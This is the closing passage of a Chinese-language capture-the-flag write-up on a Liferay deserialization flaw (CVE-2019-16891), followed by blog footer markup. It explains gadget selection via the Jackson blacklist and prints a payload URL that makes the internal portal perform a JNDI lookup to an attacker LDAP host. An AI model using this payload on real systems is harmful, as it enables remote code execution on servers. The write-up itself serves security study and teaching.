!clazz.isInterface() &amp;&amp; (jsonClazz == <span class="keyword">null</span> || jsonClazz == JSONObject.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其对应的unmarshall方法当中，则是调用对应的setter方法，这符合我们的要求</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103170046051.png" alt="image-20230103170046051"></p><p>这两个类处理最大的区别就是javaClasss是否继承了Serializable接口，因此我们找恶意类条件就是不能继承Serializable接口，同时set方法有恶意操作，这种时候就去看fastjson和jackson的黑名单就可以了</p><p>比如jackson里面黑名单里的一个类刚好在我们liferay当中</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172040401.png" alt="image-20230103172040401"></p><p>同时其set方法有一个能直接触发jndi的</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172114714.png" alt="image-20230103172114714"></p><p>最终我们把这串代码放进之前的恶意flask触发重定向后，通过jndi攻击内网服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin-portal:80/c/portal/portlet_url?parameterMap=&#123;&quot;javaClass&quot;:&quot;org.hibernate.jmx.StatisticsService&quot;,&quot;sessionFactoryJNDIName&quot;:&quot;ldap://ip&quot;&#125;</span><br></pre></td></tr></table></figure></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE"><span class="toc-number">1.</span> <span class="toc-text">TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.1.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part1"><span class="toc-number">1.2.</span> <span class="toc-text">Part1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part2"><span class="toc-number">1.3.</span> <span class="toc-text">Part2</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&text=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&is_video=false&description=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)&body=Check out this article: https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&name=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&t=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>